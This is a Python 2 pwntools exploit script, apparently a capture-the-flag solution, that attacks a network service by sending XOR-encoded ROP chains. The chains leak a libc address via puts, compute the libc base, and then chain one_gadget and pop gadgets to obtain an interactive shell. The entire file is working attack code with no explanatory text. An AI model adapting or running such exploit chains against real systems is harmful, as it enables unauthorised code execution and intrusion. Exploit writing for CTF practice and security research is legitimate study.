#!/usr/bin/env python2

from pwn import *
from IPython import embed

context.arch = 'amd64'
e = ELF('./libc.so.6')
r = remote('127.0.0.1', 7122)
#r = remote('10.13.2.43', 30739)

main = 0x40099c
pop_rdi_ret = 0x400a23
read_got = 0x600ea8
puts_plt = 0x400650

def p(x):
	return 0xffffffffffffffff^x

r.recvuntil('string:')
r.send((flat(0xfffffffffffff1ff)+
	'B'*32+
	flat(p(pop_rdi_ret), p(read_got), p(puts_plt), [p(main)]*5)
	).ljust(128, 'A'))

r.recvuntil('xor :')
r.send((flat(0xfffffffffffff0ff)+
	'B'*32
	).ljust(128, '\xff'))

#raw_input('@')
x = r.recvrepeat(0.2)
libc_read = u64(x[7:13].ljust(8, '\x00'))
libc_base = libc_read-e.symbols['read']
print x
print 'libc_read:', hex(libc_read)
print 'libc_base:', hex(libc_base)
one_gadget = 0xcd0f3
print 'libc_one_gadget:', hex(libc_base+one_gadget)

r.send(('').ljust(128, 'A'))

r.recvuntil('xor :')
r.send(('a'*6).ljust(128, 'A'))


r.recvuntil('string:')
r.send((flat(0xfffffffffffff1ff)+
	'B'*32+
	flat(p(0))+
	flat(p(0))+
	flat(p(libc_base+one_gadget))+
	flat(p(libc_base+one_gadget))+
	flat(p(libc_base+one_gadget))+
	flat(p(libc_base+one_gadget))+
	flat(p(libc_base+one_gadget))+
	flat(p(libc_base+one_gadget))+
	flat(p(libc_base+one_gadget))
	).ljust(128, 'A'))

r.recvuntil('xor :')
r.send((flat(0xfffffffffffff0ff)+
	'B'*32
	).ljust(128, '\xff'))

r.recvuntil('string:')
r.send(('').ljust(128, 'A'))

r.recvuntil('xor :')
r.send(('a'*6).ljust(128, 'A'))

raw_input('@@')
pop_r12_ret = libc_base+0x1156f6
pop_rcx_rbx_ret = libc_base+0xea66a
r.recvuntil('string:')
r.send((flat(0xfffffffffffff1ff)+
	flat(p(0))+
	flat(p(0))+
	flat(p(0))+
	flat(p(libc_base+one_gadget))+
	flat(p(pop_r12_ret))+
	flat(p(0))+
	flat(p(pop_rcx_rbx_ret))+
	flat(p(0))+
	flat(p(0))+
	flat(p(libc_base+one_gadget))+
	flat(p(libc_base+one_gadget))+
	flat(p(libc_base+one_gadget))+
	flat(p(libc_base+one_gadget))
	).ljust(128, 'A'))

r.recvuntil('xor :')
r.send((flat(0xfffffffffffff0ff)
	).ljust(128, '\xff'))

r.interactive()

